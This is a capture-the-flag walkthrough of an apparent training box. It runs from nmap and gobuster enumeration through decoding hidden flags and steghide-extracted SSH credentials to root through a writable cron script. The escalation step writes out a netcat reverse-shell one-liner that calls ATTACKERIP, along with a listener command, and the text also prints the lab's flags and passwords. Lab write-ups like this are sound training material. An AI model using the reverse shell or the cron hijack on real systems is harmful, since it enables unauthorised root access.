---
dg-publish: true
---
# Enumeration
1) NMAP Scan of Target
	1) nmap -sV -p- (IP ADDRESS
```
		1) PORT      STATE SERVICE VERSION
			80/tcp    open  http    nginx 1.16.1
			6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
			65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))

```
- Questions
	- How many ports are open?
		- 3
	- What is the version of nginx?
		- 1.16.1
	- What is running on the highest port?
		- Browse to IP Address and Port - Apache

# Compromising the Machine

1) Use GoBuster to get the first flag 
	1) `gobuster dir -u (IP Address) -w /path/to/wordlist.txt`
		1) `/hidden`
		2) `/whatever`
	2) Browse to hidden directories and use dev tools to examine the code
		1) `hidden:ZmxhZ3tmMXJzN19mbDRnfQ==`
	3) Decode base 64 using CyberChef and enter first flag
2) Use GoBuster on Apache Port and Site
	1) `gobuster dir -u http://IPADDRESS/ -w /usr/share/wordlists/dirb/common.txt`
		1) `/.htpasswd` 403
		2) /.hta - 403
		3) /.htaccess - 403          
		4) /index.html - 200         
		5) /robots.txt - 200      
		6) /server-status - 403
	2) User Agent Hash located at robots.txt
		1) User-Agent:a18672860d0510e5ab6699730763b250
		2) I used hashes.com to successfully decrypt the second flag from this hash
			1) flag{1m_s3c0nd_fl4g}
	3) View the source of this page to see if there is any additional information that its hiding
		1) `<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>`
		2) That last part is base62. Decode with CyberChef again
			1) /n0th1ng3ls3m4tt3r - hidden directory on website
		3) Found `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`
		4) Use md5hashing to decrypt the hash
			1) Use the all hashes function 
			2) mypasswordforthatjob
		5) Download the binary image on the website as well
		6) Use steghide to extract any information
			1) `steghide extract -sf /path/to/picture.jpg
			2) `cat secrettext.txt
				1) Username: Boring
				2) PW: iconvertedmypasswordtobinary (converted from the binary found in text docucment)
	4) Use these credentials to login via SSH on port 6498
		1)  `ssh -p 6498 username@IPaddress`
	5) Explore the files available and find the user flag

# Escalation to Root #

1) Use LINPEAS on the target to see what is available
	1) can use SCP to securely copy it over or download it from the github
	2) Potential Vulnerabilities
		1) `cd /var/www/ && sudo bash .mysecretcronjob.sh
	3) Browse to location and use `cat` to read the script
		1)  It will run whatever the contents inside the script as root
	4) Check permissions of the file to confirm it is writable
	5) Add reverse shell into script
		1) `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKERIP 4444 >/tmp/f" >> /file/you/want/appended`
	6) In a different window setup the netcat listener on the same port
		1) `nc -lnvp 4444`
		2) Wait a few moments and you will see the connection come through.
	7) Check `whoami` and confirm that you are root
	8) Browse to the typical root flag location and use `cat` to read it
